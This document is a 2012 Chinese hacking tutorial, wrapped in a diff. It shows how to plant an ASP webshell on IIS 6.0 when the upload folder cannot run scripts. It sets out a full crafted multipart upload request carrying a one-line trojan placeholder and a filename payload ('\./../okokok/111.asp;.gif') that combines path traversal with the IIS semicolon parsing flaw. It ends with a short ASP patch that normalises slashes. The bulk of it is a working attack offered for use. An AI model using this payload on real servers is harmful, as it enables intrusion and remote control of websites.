@@ -1,0 +1,65 @@
+突破上传目录没有脚本执行权限拿webshell
+作者:chouwazi 日期:2012-03-13 23:04:34字体大小: 小 中 大 
+突破您试图从目录中执行 CGI、ISAPI 或其他可执行程序，但该目录不允许执行程序拿webshell。
+
+在上传的时候遇到上传的文件不修改名字，但是上传文件的目录取消了脚本执行权限。
+
+可以试试修改数据包，nc提交来突破，最主要的是上传文件不修改名字。
+
+1.POST /fa-bu/upload/upfile1.asp HTTP/1.1  
+2.Accept: application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, */*  
+3.Referer: http://www.chouwazi.com/upload/upload.asp  
+4.Accept-Language: zh-cn  
+5.Content-Type: multipart/form-data; boundary=---------------------------7da290150c5e  
+6.Accept-Encoding: gzip, deflate  
+7.User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)  
+8.Host: www.chouwazi.com  
+
+9.Content-Length: 448  
+10.Connection: Keep-Alive  
+11.Cache-Control: no-cache  
+12.Cookie: ASPSESSIONIDSSCTCSCT=DJBKGKLBBIGNKJMBGOENNPAN  
+13.-----------------------------7da290150c5e  
+14.Content-Disposition: form-data; name="act"  
+15.upload  
+16.-----------------------------7da290150c5e  
+17.Content-Disposition: form-data; name="file1"; filename="E:\xxx\xxx\xx\111.asp;.gif"  
+18.Content-Type: text/plain  
+19.<%一句话木马%>  
+20.-----------------------------7da290150c5e  
+21.Content-Disposition: form-data; name="Submit"  
+22.up  
+23.-----------------------------7da290150c5e--  
+关键是 :
+
+1.Content-Disposition: form-data; name="file1"; filename="E:\xxx\xxx\xx\111.asp;.gif"  
+
+首先filename他是如何判断那个开始就是文件名呢? 
+
+他是判断filename里的最右边的一个"\"以后的就是文件名字了。
+
+大家应该知道， 在windows下  "\" 和 "/" 是不分家的。
+
+假设上传之后的目录为upload/，然后一个可以执行可以写的目录为 okokok/
+
+那么我们只要构造
+
+1.Content-Disposition: form-data; name="file1"; filename="E:\xxx\xxx\xx\./../okokok/111.asp;.gif"  
+那么我们上传的文件就成功的传进去了 okokok/111.asp;.gif了。
+
+就突破拿到webshell。
+
+亮点  E:\xxx\xxx\xx\./../okokok/111.asp;.gif"
+
+PS: win+iis6.0测试成功
+
+ 
+
+修补漏洞方法：
+
+1.iFindStart = InStr (iFindEnd,sInfo,"filename=""",1)+10  
+2.iFindEnd = InStr (iFindStart,sInfo,"""",1)  
+3.sFileName = Mid (sinfo,iFindStart,iFindEnd-iFindStart)  
+4.sFileName = Replace (sFileName,"/","\") // 修补方法 加上这句即可 
+5.oFileInfo.FileName = Mid (sFileName,InStrRev (sFileName, "\")+1) 
+6.oFileInfo.FilePath = Left (sFileName,InStrRev (sFileName, "\")) 
